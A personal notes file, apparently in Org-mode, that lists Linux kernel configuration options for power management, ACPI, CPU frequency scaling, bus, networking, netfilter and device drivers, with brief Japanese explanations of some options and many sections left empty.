*** Power management and ACPI options
    | Suspend to RAM and standby                                   |             |
    | Hibernation (aka 'suspend to disk')                          |             |
    | Default resume partition                                     |             |
    | Opportunistic sleep                                          | for android |
    | User space wakeup sources interface                          |             |
    | Device power management core functionality                   |             |
    | Power Management Debug Support                               |             |
    | Extra PM attributes in sysfs for low-level debugging/testing |             |
    | Test suspend/resume and wakealarm during bootup              |             |
    | Device suspend/resume watchdog                               |             |
    | Suspend/resume event tracing                                 |             |
    | Enable workqueue power-efficient mode by default             |             |
    | Cpuidle Driver for Intel Processors                          |             |

**** ACPI (Advanced Configuration and Power Interface) Support
     | Deprecated power /proc/acpi directories                    |                                                            |
     | Allow supported ACPI revision to be overriden              |                                                            |
     | EC read/write access through /sys/kernel/debug/ec          |                                                            |
     | AC Adapter                                                 | このドライバは AC アダプタオブジェクトのサポートの追加で、 |
     |                                                            | システムが AC 電源につながっているかどうかわかります。一般 |
     |                                                            | に、デスクトップは常に AC につながっているので、ラップトッ |
     |                                                            | プのみがこのオブジェクトを使います                         |
     | Battery                                                    | バッテリーの情報をサポートする。/proc/acpi/battery         |
     | Button                                                     | パワーボタンの振る舞いをサポート                           |
     | Video                                                      |                                                            |
     | Fan                                                        |                                                            |
     | Dock                                                       |                                                            |
     | Processor                                                  |                                                            |
     | IPMI                                                       |                                                            |
     | Processor Aggregator                                       |                                                            |
     | Thermal Zone                                               |                                                            |
     | NUMA support                                               |                                                            |
     | ACPI tables override via initrd                            | ブート時に BIOS の ACPI テーブルを上書きしてくれる         |
     | Debug Statements                                           |                                                            |
     | PCI slot detection driver                                  |                                                            |
     | Container and Module Devices                               |                                                            |
     | Smart Battery System                                       |                                                            |
     | Hardware Error Device                                      |                                                            |
     | Boottime Graphics Resource Table support                   |                                                            |
     | ACPI NVDIMM Firmware Interface Table (NFIT)                |                                                            |
     | ACPI Platform Error Interface (APEI)                       |                                                            |
     | APEI Generic Hardware Error Source                         |                                                            |
     | APEI PCIe AER logging/recovering support                   |                                                            |
     | APEI memory error recovering support                       |                                                            |
     | APEI Error Record Serialization Table (ERST) Debug Support |                                                            |
     | Extended Error Log support                                 |                                                            |
   
***** PMIC (Power Management Integrated Circuit) operation region support
   
**** SFI (Simple Firmware Interface) Support

**** APM (Advanced Power Management) BIOS support
     CPU が BIOS に "今はたいしたことをしていないから、 BIOS
     自身で電力節減に努め なさい"という指令を伝えられるようになる
     ということだけです。
     CPU のクロッ クを遅くする、ハードディスクの回転を止める、ディスプレーのバックライトを 消す等は BIOS の仕事

     *要実験　 suspend  hibernation*
     | Ignore USER SUSPEND                    |   |
     | Enable PM at boot time                 |   |
     | Make CPU Idle calls when idle          |   |
     | Enable console blanking using APM      |   |
     | Allow interrupts during APM BIOS calls |   |

**** CPU Frequency scaling
     | CPU Frequency scaling                                   |                                                                                                          |
     | CPU frequency translation statistics                    |                                                                                                          |
     | CPU frequency translation statistics details            |                                                                                                          |
     | 'performance' governor                                  |                                                                                                          |
     | 'powersave' governor                                    |                                                                                                          |
     | 'userspace' governor for userspace frequency scaling    |                                                                                                          |
     | 'ondemand' cpufreq policy governor                      |                                                                                                          |
     | 'conservative' cpufreq governor                         |                                                                                                          |
     | Intel P state control                                   |                                                                                                          |
     | Processor Clocking Control interface driver             |                                                                                                          |
     | ACPI Processor P-States driver                          | CPU のクロック周波数とともに電圧も低くなり、パフォーマンスの低下により電力消費と発生熱量が低くなります。 |
     | Legacy cpb sysfs knob support for AMD CPUs              |                                                                                                          |
     | AMD Mobile K6-2/K6-3 PowerNow!                          |                                                                                                          |
     | AMD Mobile Athlon/Duron PowerNow!                       |                                                                                                          |
     | AMD Opteron/Athlon64 PowerNow!                          |                                                                                                          |
     | AMD frequency sensitivity feedback powersave bias       |                                                                                                          |
     | Cyrix MediaGX/NatSemi Geode Suspend Modulation          |                                                                                                          |
     | Intel Enhanced SpeedStep (deprecated)                   |                                                                                                          |
     | Built-in tables for Banias CPUs                         |                                                                                                          |
     | Intel Speedstep on ICH-M chipsets (ioport interface)    |                                                                                                          |
     | Intel SpeedStep on 440BX/ZX/MX chipsets (SMI interface) |                                                                                                          |
     | Intel Pentium 4 clock modulation                        | CPU のクロック周波数は低くなりますが、電圧は低下しません。                                               |
     | nVidia nForce2 FSB changing                             |                                                                                                          |
     | Transmeta LongRun                                       |                                                                                                          |
     | VIA Cyrix III Longhaul                                  |                                                                                                          |
     | VIA C7 Enhanced PowerSaver (DANGEROUS)                  |                                                                                                          |
     | Relaxed speedstep capability checks                     |                                                                                                          |

***** Default CPUFreq governor (ondemand)
      | performance  |   |
      | powersave    |   |
      | userspace    |   |
      | ondemand     |   |
      | conservative |   |

**** CPU Idle
     | Ladder governor (for periodic timer tick) |   |
     | Menu governor (for tickless system)       |   |
  
*** Bus options (PCI etc.)
    | PCI support                                                  |                                              |
    | PCI Express Port Bus support                                 |                                              |
    | PCI Express Hotplug driver                                   |                                              |
    | Root Port Advanced Error Reporting support                   |                                              |
    | PCI Express ECRC settings control                            |                                              |
    | PCIe AER error injector support                              |                                              |
    | PCI Express ASPM control                                     |                                              |
    | Debug PCI Express ASPM                                       |                                              |
    | Message Signaled Interrupts (MSI and MSI-X)                  |                                              |
    | Enable PCI resource re-allocation detection                  |                                              |
    | PCI Stub driver                                              |                                              |
    | Interrupts on hypertransport devices                         |                                              |
    | PCI IOV support                                              | 1 つの物理ポートを複数の仮想マシンと共有でき |
    | PCI PRI support                                              |                                              |
    | PCI PASID support                                            |                                              |
    | ISA support                                                  |                                              |
    | EISA support                                                 |                                              |
    | NatSemi SCx200 support                                       |                                              |
    | NatSemi SCx200 27MHz High-Resolution Timer Support           |                                              |
    | PCEngines ALIX System Support (LED setup)                    |                                              |
    | Soekris Engineering net5501 System Support (LEDS, GPIO, etc) |                                              |
    | Traverse Technologies GEOS System Support (LEDS, GPIO, etc)  |                                              |
    | RapidIO support                                              |                                              |
    | Mark VGA/VBE/EFI FB as generic system framebuffer            |                                              |

**** PCI access mode (Any)
     | BIOS     |   |
     | MMConfig |   |
     | Direct   |   |
     | Any      |   |

**** Default ASPM policy (BIOS default)
     | BIOS default |   |
     | Powersave    |   |
     | Performance  |   |

**** PCI host controller drivers

**** PCCard (PCMCIA/CardBus) support
     | 16-bit PCMCIA support                   |   |
     | Load CIS updates from userspace         |   |
     | 32-bit CardBus support                  |   |
     | CardBus yenta-compatible bridge support |   |
     | Cirrus PD6729 compatible bridge support |   |
     | i82092 compatible bridge support        |   |
     | i82365 compatible bridge support        |   |
     | Databook TCIC host bridge support       |   |
  
**** Support for PCI Hotplug
     | Compaq PCI Hotplug driver                       |   |
     | Save configuration into NVRAM on Compaq servers |   |
     | IBM PCI Hotplug driver                          |   |
     | ACPI PCI Hotplug driver                         |   |
     | ACPI PCI Hotplug driver IBM extensions          |   |
     | CompactPCI Hotplug driver                       |   |
     | Ziatech ZT5550 CompactPCI Hotplug driver        |   |
     | Generic port I/O CompactPCI Hotplug driver      |   |
     | SHPC PCI Hotplug driver                         |   |

*** Executable file formats / Emulations
     | Kernel support for ELF binaries             |                                               |
     | Write ELF core dumps with partial segments  |                                               |
     | Kernel support for scripts starting with #! |                                               |
     | Kernel support for a.out and ECOFF binaries |                                               |
     | Kernel support for MISC binaries            |                                               |
     | Enable core dump support                    | ELF 形式のコア・ダンプを作成する機能を提供する |

*** Networking support

    | RxRPC session sockets                  |   |
    | Ceph core library                      |   |
    | Include file:line in ceph debug output |   |
    | Use in-kernel support for DNS lookup   |   |

**** Networking options
     | Packet socket                                         |   |
     | Packet: sockets monitoring interface                  |   |
     | Unix domain sockets                                   |   |
     | UNIX: socket monitoring interface                     |   |
     | Transformation user configuration interface           |   |
     | Transformation sub policy support                     |   |
     | Transformation migrate database                       |   |
     | Transformation statistics                             |   |
     | PF_KEY sockets                                        |   |
     | PF_KEY MIGRATE                                        |   |
     | TCP/IP networking                                     |   |
     | IP: multicasting                                      |   |
     | IP: advanced router                                   |   |
     | FIB TRIE statistics                                   |   |
     | IP: policy routing                                    |   |
     | IP: equal cost multipath                              |   |
     | IP: verbose route monitoring                          |   |
     | IP: kernel level autoconfiguration                    |   |
     | IP: tunneling                                         |   |
     | IP: GRE demultiplexer                                 |   |
     | IP: GRE tunnels over IP                               |   |
     | IP: broadcast GRE over IP                             |   |
     | IP: multicast routing                                 |   |
     | IP: multicast policy routing                          |   |
     | IP: PIM-SM version 1 support                          |   |
     | IP: PIM-SM version 2 support                          |   |
     | IP: TCP syncookie support                             |   |
     | Virtual (secure) IP: tunneling                        |   |
     | IP: Foo (IP protocols) over UDP                       |   |
     | IP: FOU encapsulation of IP tunnels                   |   |
     | Generic Network Virtualization Encapsulation library  |   |
     | IP: AH transformation                                 |   |
     | IP: ESP transformation                                |   |
     | IP: IPComp transformation                             |   |
     | IP: IPsec transport mode                              |   |
     | IP: IPsec tunnel mode                                 |   |
     | IP: IPsec BEET mode                                   |   |
     | Large Receive Offload (ipv4/tcp)                      |   |
     | INET: socket monitoring interface                     |   |
     | UDP: socket monitoring interface                      |   |
     | TCP: MD5 Signature Option support (RFC2385)           |   |
     | NetLabel subsystem support                            |   |
     | Security Marking                                      |   |
     | Timestamping in PHY devices                           |   |
     | The RDS Protocol                                      |   |
     | Asynchronous Transfer Mode (ATM)                      |   |
     | Classical IP over ATM                                 |   |
     | Do NOT send ICMP if no neighbour                      |   |
     | LAN Emulation (LANE) support                          |   |
     | Multi-Protocol Over ATM (MPOA) support                |   |
     | RFC1483/2684 Bridged protocols                        |   |
     | Per-VC IP filter kludge                               |   |
     | 802.1d Ethernet Bridging                              |   |
     | IGMP/MLD snooping                                     |   |
     | VLAN filtering                                        |   |
     | 802.1Q/802.1ad VLAN Support                           |   |
     | GVRP (GARP VLAN Registration Protocol) support        |   |
     | MVRP (Multiple VLAN Registration Protocol) support    |   |
     | DECnet Support                                        |   |
     | DECnet: router support                                |   |
     | ANSI/IEEE 802.2 LLC type 2 Support                    |   |
     | The IPX protocol                                      |   |
     | IPX: Full internal IPX network                        |   |
     | Appletalk protocol support                            |   |
     | Appletalk interfaces support                          |   |
     | Apple/Farallon LocalTalk PC support                   |   |
     | COPS LocalTalk PC support                             |   |
     | Appletalk-IP driver support                           |   |
     | IP to Appletalk-IP Encapsulation support              |   |
     | CCITT X.25 Packet Layer                               |   |
     | LAPB Data Link Driver                                 |   |
     | Phonet protocols family                               |   |
     | Data Center Bridging support                          |   |
     | DNS Resolver support                                  |   |
     | B.A.T.M.A.N. Advanced Meshing Protocol                |   |
     | Bridge Loop Avoidance                                 |   |
     | Distributed ARP Table                                 |   |
     | Network Coding                                        |   |
     | Multicast optimisation                                |   |
     | Open vSwitch                                          |   |
     | Open vSwitch GRE tunneling support                    |   |
     | Virtual Socket protocol                               |   |
     | VMware VMCI transport for Virtual Sockets             |   |
     | NETLINK: mmaped IO                                    |   |
     | NETLINK: socket monitoring interface                  |   |
     | High-availability Seamless Redundancy (HSR)           |   |
     | Switch (and switch-ish) device support (EXPERIMENTAL) |   |
     | Network priority cgroup                               |   |
     | Network classid cgroup                                |   |

***** TCP: advanced congestion control
     | Binary Increase Congestion (BIC) control |   |
     | CUBIC TCP                                |   |
     | TCP Westwood+                            |   |
     | H-TCP                                    |   |
     | High Speed TCP                           |   |
     | TCP-Hybla congestion control algorithm   |   |
     | TCP Vegas                                |   |
     | Scalable TCP                             |   |
     | TCP Low Priority                         |   |
     | TCP Veno                                 |   |
     | YeAH TCP                                 |   |
     | TCP Illinois                             |   |
     | DataCenter TCP (DCTCP)                   |   |
     | CAIA Delay-Gradient (CDG)                |   |

****** Default TCP congestion control (Cubic)
     | Cubic |   |
     | Reno  |   |

***** The IPv6 protocol
***** Network packet filtering framework (Netfilter)
      | Network packet filtering debugging |   |
      | Advanced netfilter configuration   |   |
      | Bridged IP/ARP packets filtering   |   |

****** Core Netfilter Configuration
       | Netfilter NFACCT over NFNETLINK interface             |   |
       | Netfilter NFQUEUE over NFNETLINK interface            |   |
       | Netfilter LOG over NFNETLINK interface                |   |
       | Netfilter connection tracking support                 |   |
       | Connection mark tracking support                      |   |
       | Connection tracking security mark support             |   |
       | Connection tracking zones                             |   |
       | Supply CT list in procfs (OBSOLETE)                   |   |
       | Connection tracking events                            |   |
       | Connection tracking timeout                           |   |
       | Connection tracking timestamping                      |   |
       | DCCP protocol connection tracking support             |   |
       | SCTP protocol connection tracking support             |   |
       | UDP-Lite protocol connection tracking support         |   |
       | Amanda backup protocol support                        |   |
       | FTP protocol support                                  |   |
       | H.323 protocol support                                |   |
       | IRC protocol support                                  |   |
       | NetBIOS name service protocol support                 |   |
       | SNMP service protocol support                         |   |
       | PPtP protocol support                                 |   |
       | SANE protocol support                                 |   |
       | SIP protocol support                                  |   |
       | TFTP protocol support                                 |   |
       | Connection tracking netlink interface                 |   |
       | Connection tracking timeout tuning via Netlink        |   |
       | Connection tracking helpers in user-space via Netlink |   |
       | NFQUEUE integration with Connection Tracking          |   |
       | IPv4/IPv6 redirect support                            |   |
       | Netfilter nf_tables support                           |   |
       | Netfilter Xtables support (required for ip_tables)    |   |
       | *** Xtables combined modules ***                      |   |
       | nfmark target and match support                       |   |
       | ctmark target and match support                       |   |
       | set target and match support                          |   |
       | *** Xtables targets ***                               |   |
       | AUDIT target support                                  |   |
       | CHECKSUM target support                               |   |
       | "CLASSIFY" target support                             |   |
       | "CONNMARK" target support                             |   |
       | "CONNSECMARK" target support                          |   |
       | "CT" target support                                   |   |
       | "DSCP" and "TOS" target support                       |   |
       | "HL" hoplimit target support                          |   |
       | "HMARK" target support                                |   |
       | IDLETIMER target support                              |   |
       | "LED" target support                                  |   |
       | LOG target support                                    |   |
       | "MARK" target support                                 |   |
       | "SNAT and DNAT" targets support                       |   |
       | "NETMAP" target support                               |   |
       | "NFLOG" target support                                |   |
       | "NFQUEUE" target Support                              |   |
       | "NOTRACK" target support (DEPRECATED)                 |   |
       | "RATEEST" target support                              |   |
       | REDIRECT target support                               |   |
       | "TEE" - packet cloning to alternate destination       |   |
       | "TPROXY" target transparent proxying support          |   |
       | "TRACE" target support                                |   |
       | "SECMARK" target support                              |   |
       | "TCPMSS" target support                               |   |
       | "TCPOPTSTRIP" target support                          |   |
       | *** Xtables matches ***                               |   |
       | "addrtype" address type match support                 |   |
       | "bpf" match support                                   |   |
       | "control group" match support                         |   |
       | "cluster" match support                               |   |
       | "comment" match support                               |   |
       | "connbytes" per-connection counter match support      |   |
       | "connlabel" match support                             |   |
       | "connlimit" match support                             |   |
       | "connmark" connection mark match support              |   |
       | "conntrack" connection tracking match support         |   |
       | "cpu" match support                                   |   |
       | "dccp" protocol match support                         |   |
       | "devgroup" match support                              |   |
       | "dscp" and "tos" match support                        |   |
       | "ecn" match support                                   |   |
       | "esp" match support                                   |   |
       | "hashlimit" match support                             |   |
       | "helper" match support                                |   |
       | "hl" hoplimit/TTL match support                       |   |
       | "ipcomp" match support                                |   |
       | "iprange" address range match support                 |   |
       | "ipvs" match support                                  |   |
       | "l2tp" match support                                  |   |
       | "length" match support                                |   |
       | "limit" match support                                 |   |
       | "mac" address match support                           |   |
       | "mark" match support                                  |   |
       | "multiport" Multiple port match support               |   |
       | "nfacct" match support                                |   |
       | "osf" Passive OS fingerprint match                    |   |
       | "owner" match support                                 |   |
       | IPsec "policy" match support                          |   |
       | "physdev" match support                               |   |
       | "pkttype" packet type match support                   |   |
       | "quota" match support                                 |   |
       | "rateest" match support                               |   |
       | "realm" match support                                 |   |
       | "recent" match support                                |   |
       | "sctp" protocol match support                         |   |
       | "socket" match support                                |   |
       | "state" match support                                 |   |
       | "statistic" match support                             |   |
       | "string" match support                                |   |
       | "tcpmss" match support                                |   |
       | "time" match support                                  |   |
       | "u32" match support                                   |   |

****** IP set support
       | Maximum number of IP sets     |   |
       | bitmap:ip set support         |   |
       | bitmap:ip,mac set support     |   |
       | bitmap:port set support       |   |
       | hash:ip set support           |   |
       | hash:ip,mark set support      |   |
       | hash:ip,port set support      |   |
       | hash:ip,port,ip set support   |   |
       | hash:ip,port,net set support  |   |
       | hash:mac set support          |   |
       | hash:net,port,net set support |   |
       | hash:net set support          |   |
       | hash:net,net set support      |   |
       | hash:net,port set support     |   |
       | hash:net,iface set support    |   |
       | list:set set support          |   |
  
****** IP virtual server support
       | IP virtual server debugging                                 |   |
       | IPVS connection table size (the Nth power of 2)             |   |
       | TCP load balancing support                                  |   |
       | UDP load balancing support                                  |   |
       | ESP load balancing support                                  |   |
       | AH load balancing support                                   |   |
       | SCTP load balancing support                                 |   |
       | round-robin scheduling                                      |   |
       | weighted round-robin scheduling                             |   |
       | least-connection scheduling                                 |   |
       | weighted least-connection scheduling                        |   |
       | weighted failover scheduling                                |   |
       | locality-based least-connection scheduling                  |   |
       | locality-based least-connection with replication scheduling |   |
       | destination hashing scheduling                              |   |
       | source hashing scheduling                                   |   |
       | shortest expected delay scheduling                          |   |
       | never queue scheduling                                      |   |
       | IPVS source hashing table size (the Nth power of 2)         |   |
       | FTP protocol helper                                         |   |
       | Netfilter connection tracking                               |   |
       | SIP persistence engine                                      |   |

****** IP: Netfilter Configuration
       | proc/sysctl compatibility with old connection tracking |   |
       | ARP packet logging                                     |   |
       | IPv4 packet logging                                    |   |
       | IPv4 packet rejection                                  |   |
       | IPv4 NAT                                               |   |
       | IPv4 masquerade support                                |   |
       | Basic SNMP-ALG support                                 |   |
       | IP tables support (required for filtering/masq/NAT)    |   |
       | "ah" match support                                     |   |
       | "ecn" match support                                    |   |
       | "rpfilter" reverse path filter match support           |   |
       | "ttl" match support                                    |   |
       | Packet filtering                                       |   |
       | REJECT target support                                  |   |
       | SYNPROXY target support                                |   |
       | iptables NAT support                                   |   |
       | Packet mangling                                        |   |
       | CLUSTERIP target support                               |   |
       | ECN target support                                     |   |
       | "TTL" target support                                   |   |
       | raw table support (required for NOTRACK/TRACE)         |   |
       | Security table                                         |   |
       | ARP tables support                                     |   |
       | ARP packet filtering                                   |   |
       | ARP payload mangling                                   |   |

****** DECnet: Netfilter Configuration
       | Routing message grabulator (for userland routing daemon) |   |

****** Ethernet Bridge tables (ebtables) support
       | ebt: broute table support       |   |
       | ebt: filter table support       |   |
       | ebt: nat table support          |   |
       | ebt: 802.3 filter support       |   |
       | ebt: among filter support       |   |
       | ebt: ARP filter support         |   |
       | ebt: IP filter support          |   |
       | ebt: limit match support        |   |
       | ebt: mark filter support        |   |
       | ebt: packet type filter support |   |
       | ebt: STP filter support         |   |
       | ebt: 802.1Q VLAN filter support |   |
       | ebt: arp reply target support   |   |
       | ebt: dnat target support        |   |
       | ebt: mark target support        |   |
       | ebt: redirect target support    |   |
       | ebt: snat target support        |   |
       | ebt: log support                |   |
       | ebt: nflog support              |   |
  
***** The DCCP Protocol
***** The SCTP Protocol
      | SCTP: Association probing                                   |   |
      | SCTP: Debug object counts                                   |   |
      | Default SCTP cookie HMAC encoding (Enable optional MD5 hmac |   |
      | Enable optional MD5 hmac cookie generation                  |   |
      | Enable optional SHA1 hmac cookie generation                 |   |

***** The TIPC Protocol
***** Layer Two Tunneling Protocol (L2TP)
      | L2TPv3 support |   |

***** IEEE Std 802.15.4 Low-Rate Wireless Personal Area Networks support
***** QoS and/or fair queueing
      | Class Based Queueing (CBQ)                                |   |
      | Hierarchical Token Bucket (HTB)                           |   |
      | Hierarchical Fair Service Curve (HFSC)                    |   |
      | ATM Virtual Circuits (ATM)                                |   |
      | Multi Band Priority Queueing (PRIO)                       |   |
      | Hardware Multiqueue-aware Multi Band Queuing (MULTIQ)     |   |
      | Random Early Detection (RED)                              |   |
      | Stochastic Fair Blue (SFB)                                |   |
      | Stochastic Fairness Queueing (SFQ)                        |   |
      | True Link Equalizer (TEQL)                                |   |
      | Token Bucket Filter (TBF)                                 |   |
      | Generic Random Early Detection (GRED)                     |   |
      | Differentiated Services marker (DSMARK)                   |   |
      | Network emulator (NETEM)                                  |   |
      | Deficit Round Robin scheduler (DRR)                       |   |
      | Multi-queue priority scheduler (MQPRIO)                   |   |
      | CHOose and Keep responsive flow scheduler (CHOKE)         |   |
      | Quick Fair Queueing scheduler (QFQ)                       |   |
      | Controlled Delay AQM (CODEL)                              |   |
      | Fair Queue Controlled Delay AQM (FQ_CODEL)                |   |
      | Fair Queue                                                |   |
      | Heavy-Hitter Filter (HHF)                                 |   |
      | Proportional Integral controller Enhanced (PIE) scheduler |   |
      | Ingress Qdisc                                             |   |
      | Plug network traffic until release (PLUG)                 |   |
      | *** Classification ***                                    |   |
      | Elementary classification (BASIC)                         |   |
      | Traffic-Control Index (TCINDEX)                           |   |
      | Routing decision (ROUTE)                                  |   |
      | Netfilter mark (FW)                                       |   |
      | Universal 32bit comparisons w/ hashing (U32)              |   |
      | Performance counters support                              |   |
      | Netfilter marks support                                   |   |
      | IPv4 Resource Reservation Protocol (RSVP)                 |   |

***** MultiProtocol Label Switching
      | MPLS: GSO support     |   |
      | MPLS: routing support |   |

***** Network testing
      | Packet Generator (USE WITH CAUTION) |   |
      | TCP connection probing              |   |

**** Amateur Radio support
     | Amateur Radio AX.25 Level 2 protocol |   |
     | AX.25 DAMA Slave support             |   |
     | Amateur Radio NET/ROM protocol       |   |
     | Amateur Radio X.25 PLP (Rose)        |   |
     
***** AX.25 network device drivers
      | Serial port 6PACK driver                              |   |
      | BPQ Ethernet driver                                   |   |
      | Z8530 SCC driver                                      |   |
      | additional delay for PA0HZP OptoSCC compatible boards |   |
      | support for TRX that feedback the tx signal to rx     |   |
      | BAYCOM ser12 fullduplex driver for AX.25              |   |
      | BAYCOM ser12 halfduplex driver for AX.25              |   |
      | BAYCOM picpar and par96 driver for AX.25              |   |
      | BAYCOM epp driver for AX.25                           |   |
      | YAM driver for AX.25                                  |   |

**** CAN bus subsystem support
     | Raw CAN Protocol (raw access with CAN-ID filtering)     |   |
     | Broadcast Manager CAN Protocol (with content filtering) |   |
     | CAN Gateway/Router (with netlink configuration)         |   |

***** CAN Device Drivers
      | Virtual Local CAN Interface (vcan)            |   |
      | Serial / USB serial CAN Adaptors (slcan)      |   |
      | Platform CAN drivers with Netlink support     |   |
      | CAN bit-timing calculation                    |   |
      | Enable LED triggers for Netlink based drivers |   |
      | Intel EG20T PCH CAN controller                |   |
      | Bosch M_CAN devices                           |   |
      | Softing Gmbh CAN generic support              |   |
      | Softing Gmbh CAN pcmcia cards                 |   |
      | CAN devices debugging messages                |   |
                     
****** Philips/NXP SJA1000 devices
      | ISA Bus based legacy SJA1000 driver        |   |
      | Generic Platform Bus based SJA1000 driver  |   |
      | EMS CPC-CARD Card                          |   |
      | EMS CPC-PCI, CPC-PCIe and CPC-104P Card    |   |
      | PEAK PCAN-PC Card                          |   |
      | PEAK PCAN-PCI/PCIe/miniPCI Cards           |   |
      | PEAK PCAN-ExpressCard Cards                |   |
      | Kvaser PCIcanx and Kvaser PCIcan PCI Cards |   |
      | PLX90xx PCI-bridge based Cards             |   |
      | TS-CAN1 PC104 boards                       |   |

****** Bosch C_CAN/D_CAN devices

****** Bosch CC770 and Intel AN82527 devices
      | ISA Bus based legacy CC770 driver       |   |
      | Generic Platform Bus based CC770 driver |   |

****** CAN SPI interfaces
      | Microchip MCP251x SPI CAN controllers |   |

****** CAN USB interfaces
      | EMS CPC-USB/ARM7 CAN/USB interface                   |   |
      | ESD USB/2 CAN/USB interface                          |   |
      | Geschwister Schneider UG interfaces                  |   |
      | Kvaser CAN/USB interface                             |   |
      | PEAK PCAN-USB/USB Pro interfaces for CAN 2.0b/CAN-FD |   |
      | 8 devices USB2CAN interface                          |   |
  
**** IrDA (infrared) subsystem support
     |IrLAN protocol ||
     |IrNET protocol ||
     |IrCOMM protocol ||
     |Ultra (connectionless) protocol ||
     |Cache last LSAP ||
     |Fast RRs (low latency) ||
     |Debug information ||
***** Infrared-port device drivers
      | IrTTY (uses Linux serial driver)        |   |
      | Serial dongle support                   |   |
      | ESI JetEye PC dongle                    |   |
      | ACTiSYS IR-220L and IR220L+ dongle      |   |
      | Tekram IrMate 210B dongle               |   |
      | TOIM3232 IrDa dongle                    |   |
      | Parallax LiteLink dongle                |   |
      | Mobile Action MA600 dongle              |   |
      | Greenwich GIrBIL dongle                 |   |
      | Microchip MCP2120                       |   |
      | Old Belkin dongle                       |   |
      | ACTiSYS IR-200L dongle                  |   |
      | KingSun/DonShine DS-620 IrDA-USB dongle |   |
      | KingSun Dazzle IrDA-USB dongle          |   |
      | KingSun KS-959 IrDA-USB dongle          |   |
      | IrDA USB dongles                        |   |
      | SigmaTel STIr4200 bridge                |   |
      | NSC PC87108/PC87338                     |   |
      | Winbond W83977AF (IR)                   |   |
      | Toshiba Type-O IR Port                  |   |
      | SMSC IrCC                               |   |
      | ALi M5123 FIR                           |   |
      | VLSI 82C147 SIR/MIR/FIR                 |   |
      | VIA VT8231/VT1211 SIR/MIR/FIR           |   |
      | MosChip MCS7780 IrDA-USB dongle         |   |

**** Bluetooth subsystem support
     | Bluetooth Classic (BR/EDR) features |   |
     | RFCOMM protocol support             |   |
     | RFCOMM TTY support                  |   |
     | BNEP protocol support               |   |
     | Multicast filter support            |   |
     | Protocol filter support             |   |
     | CMTP protocol support               |   |
     | HIDP protocol support               |   |
     | Bluetooth Low Energy (LE) features  |   |

**** Bluetooth device drivers
     | HCI USB driver                        |   |
     | Broadcom protocol support             |   |
     | Realtek protocol support              |   |
     | HCI SDIO driver                       |   |
     | HCI UART driver                       |   |
     | UART (H4) protocol support            |   |
     | BCSP protocol support                 |   |
     | Atheros AR300x serial support         |   |
     | HCILL protocol support                |   |
     | Three-wire UART (H5) protocol support |   |
     | Intel protocol support                |   |
     | Broadcom protocol support             |   |
     | HCI BCM203x USB driver                |   |
     | HCI BPA10x USB driver                 |   |
     | HCI BlueFRITZ! USB driver             |   |
     | HCI DTL1 (PC Card) driver             |   |
     | HCI BT3C (PC Card) driver             |   |
     | HCI BlueCard (PC Card) driver         |   |
     | HCI UART (PC Card) device driver      |   |
     | HCI VHCI (Virtual HCI device) driver  |   |
     | Marvell Bluetooth driver support      |   |
     | Marvell BT-over-SDIO driver           |   |
     | Atheros firmware download driver      |   |

**** Wireless
     | cfg80211 - wireless configuration API                 |   |
     | nl80211 testmode command                              |   |
     | enable developer warnings                             |   |
     | cfg80211 regulatory debugging                         |   |
     | enable powersave by default                           |   |
     | lib80211 debugging messages                           |   |
     | Generic IEEE 802.11 Networking Stack (mac80211)       |   |
     | Enable mac80211 mesh networking (pre-802.11s) support |   |
     | Enable LED triggers                                   |   |
     | Trace all mac80211 debug messages                     |   |

***** Default rate control algorithm (Minstrel)
***** Select mac80211 debugging features

**** WiMAX Wireless Broadband support
     | WiMAX debug level |   |

**** RF switch subsystem support
     | Generic rfkill regulator driver |   |
     | GPIO RFKILL driver              |   |

**** Plan 9 Resource Sharing Support (9P2000)
     | 9P RDMA Transport (Experimental) |   |
     | Debug information                |   |

**** CAIF support

**** NFC subsystem support
     | NFC Digital Protocol stack support |   |
     | NCI protocol support               |   |
     | NCI over SPI protocol support      |   |
     | NCI over UART protocol support     |   |
     | NFC HCI implementation             |   |

***** Near Field Communication (NFC) devices
     | NXP PN533 USB driver                 |   |
     | NFC hardware simulator driver        |   |
     | Marvell NFC driver support           |   |
     | STMicroelectronics ST NCI NFC driver |   |
     | NXP-NCI NFC driver                   |   |
                                 
*** Device Drivers

**** Generic Driver Options
     | Select only drivers that don't need compile-time external firmware | 外部ファームウェアを必要としないドライバのみ選択可能とする                           |
     | Prevent firmware from being built                                  | ファームウェアのコンパイルを避ける (ファームウェアは通常ドライバと共に提供されている) |
     | Driver Core verbose debug messages                                 | デバッグメッセージを出力する                                                         |
     |                                                                    |                                                                                      |

**** Bus devices

**** Connector - unified userspace <-> kernelspace linker
     ユーザ空間とカーネル空間の結合ドライバ

**** Memory Technology Device (MTD) support
     メインメモリ以外のメモリデバイスのサポート
     素の RAM やフラッシュ ROM をディスクとして扱う機能です。

**** Device Tree and Open Firmware support

**** Parallel port support
**** Plug and Play support

**** Block devices
| Normal floppy disk support | フロッピーディスクを使用可能にするかどうか |
|                            |                                            |
|                            |                                            |

**** Misc devices

**** ATA/ATAPI/MFM/RLL support (DEPRECATED)

**** SCSI device support

**** Serial ATA and Parallel ATA drivers (libata)

**** Multiple devices driver support (RAID and LVM)

**** Generic Target Core Mod (TCM) and ConfigFS Infrastructure

**** Fusion MPT device supportn

**** IEEE 1394 (FireWire) support

**** Macintosh device driversn

**** Network device supportn

**** Input device support

**** Character devices
| Support for user-space parallel port device drivers | /dev/parport の作成                   |
| Hangcheck timer                                     | ハングアップ検出タイマ 主にサーバー用 |
|                                                     |                                       |

**** I2C support

**** SPI support

**** SPMI support

**** HSI support

**** PPS support

**** PTP clock support

**** GPIO Support

**** Dallas's 1-wire support

**** Power supply class support

**** Adaptive Voltage Scaling class support

**** Hardware Monitoring support

**** Generic Thermal sysfs driver

**** Watchdog Timer Support

**** Sonics Silicon Backplane

**** Broadcom specific AMBA

**** Multifunction device drivers

**** Voltage and Current Regulator Support

**** Multimedia support

**** Graphics support

**** Sound card support

**** HID support

**** USB support

**** Ultra Wideband devices

**** MMC/SD/SDIO card support

**** Sony MemoryStick card support

**** LED Support

**** Accessibility support

**** InfiniBand support

**** EDAC (Error Detection And Correction) reporting

**** Real Time Clock  

**** DMA Engine support  

**** Auxiliary Display support  

**** Userspace I/O drivers  

**** Virtualization drivers  

**** Virtio drivers  

**** Microsoft Hyper-V guest support  

**** Staging drivers  

**** X86 Platform Specific Device Drivers  

**** Platform support for Chrome hardware  

**** Hardware Spinlock drivers  

**** Clock Source drivers  

**** Mailbox Hardware Support  

**** IOMMU Hardware Support  

**** Remoteproc drivers  

**** Rpmsg drivers  

**** SOC (System On Chip) specific Drivers  

**** Generic Dynamic Voltage and Frequency Scaling (DVFS) support

